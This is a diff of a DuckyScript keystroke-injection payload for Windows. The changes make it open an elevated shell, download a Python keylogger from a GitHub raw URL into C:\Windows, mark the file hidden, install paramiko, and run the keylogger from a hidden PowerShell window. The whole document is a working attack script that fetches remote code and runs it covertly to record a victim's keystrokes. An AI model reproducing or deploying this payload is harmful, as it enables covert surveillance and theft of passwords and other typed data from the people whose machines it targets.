@@ -1,11 +1,31 @@
 DELAY 200
-STRING powershell
+WINDOWS d
+DELAY 200
+WINDOWS s
+DELAY 200
+STRING cmd
+DELAY 200
+RIGHT
+DELAY 200
+DOWN
+DELAY 200
+ENTER
+DELAY 500
+LEFT
+DELAY 200
 ENTER
 DELAY 200
-STRING Invoke-WebRequest -Uri "https://raw.githubusercontent.com/ASL-rgb/keylogger/main/keylogger.py" -OutFile "keylogger.py"
+WINDOWS d
+DELAY 500
+WINDOWS d
+STRING Powershell
+DELAY 200
 ENTER
-DELAY 5000
-STRING $HIDE=Get-Item keylogger.py -Force
+DELAY 200
+STRING Invoke-WebRequest -Uri "https://raw.githubusercontent.com/ASL-rgb/keylogger/main/keylogger.py" -OutFile C:\Windows\keylogger.py
+ENTER
+DELAY 200
+STRING $HIDE=Get-Item C:\Windows\keylogger.py -Force
 ENTER
 DELAY 200
 STRING $HIDE.Attributes="Hidden"
@@ -17,6 +37,13 @@ DELAY 200
 STRING pip3 install paramiko
 ENTER
 DELAY 200
-STRING python3 keylogger.py
+WINDOWS d
+DELAY 200
+GUI r
+DELAY 200
+STRING powershell -WindowStyle hidden
+DELAY 200
 ENTER
 DELAY 200
+STRING python C:\Windows\keylogger.py
+ENTER
